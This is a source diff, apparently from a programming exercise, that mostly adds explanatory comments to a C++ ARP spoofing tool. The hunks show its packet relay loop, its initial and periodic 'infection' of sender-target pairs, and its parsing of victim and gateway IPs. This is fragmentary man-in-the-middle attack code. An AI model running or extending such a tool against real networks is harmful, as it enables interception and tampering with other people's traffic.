@@ -272,20 +272,22 @@ void ArpSpoof::relayLoop()
     // --- IPv4 packet: relay from victim -> me -> real target ---
     if (eth->type() == EthHdr::Ip4)
     {
+      // step 1 : check if the packet is sent to me
       if (eth->dmac_ != myMac_) // only if sent to me
         continue;
  
       for (size_t i = 0; i < flows_.size(); i++)
       {
-        if (eth->smac_ != flows_[i].senderMac_) // find which victim sent it
+        // step 2 : check if the packet is sent from sender
+        if (eth->smac_ != flows_[i].senderMac_) 
           continue;
  
-        
-        eth->smac_ = myMac_;                 
-        eth->dmac_ = flows_[i].targetMac_;   
- 
+        // step 3 : relay the packet to the real target
+        eth->smac_ = myMac_;                // change src mac to mine 
+        eth->dmac_ = flows_[i].targetMac_;  // change dst mac to real gateway  
         std::lock_guard<std::mutex> lock(txMutex_);
         int r = pcap_sendpacket(tx_, frame, header->caplen);
+
         if (r != 0)
           fprintf(stderr, "relay error %s\n", pcap_geterr(tx_));
         break; // found the matching flow, done
@@ -340,10 +342,15 @@ bool ArpSpoof::init(const char *dev,
 // Start the attack main sequence 
 void ArpSpoof::run() 
 {
+  // Initial infection 
   for (size_t i = 0; i < flows_.size(); i++)
     infect(flows_[i]);
-  std::thread infector(&ArpSpoof::periodicInfect, this);//re-infects periodically
+  
+    // Launch background thread for continuous infection
+    std::thread infector(&ArpSpoof::periodicInfect, this);
+
   relayLoop(); // Start relaying packets and detecting recoveries
+  
   run_.store(false); 
   infector.join(); // wait for the infector thread to finish
 }
@@ -371,6 +378,9 @@ int main(int argc, char *argv[])
   }
 
   // Parse command line : group IPs info sender-target pairs 
+  // argv[1] = interface name 
+  // argv[2] = sender ip 1 , argv[3] = target ip 1
+  // argv[4] = sender ip 2 , argv[5] = target ip 2 
   std::vector<std::pair<Ip, Ip>> pairs;
   for (int i = 2; i + 1 < argc; i += 2)
     pairs.emplace_back(Ip(std::string(argv[i])), Ip(std::string(argv[i + 1])));
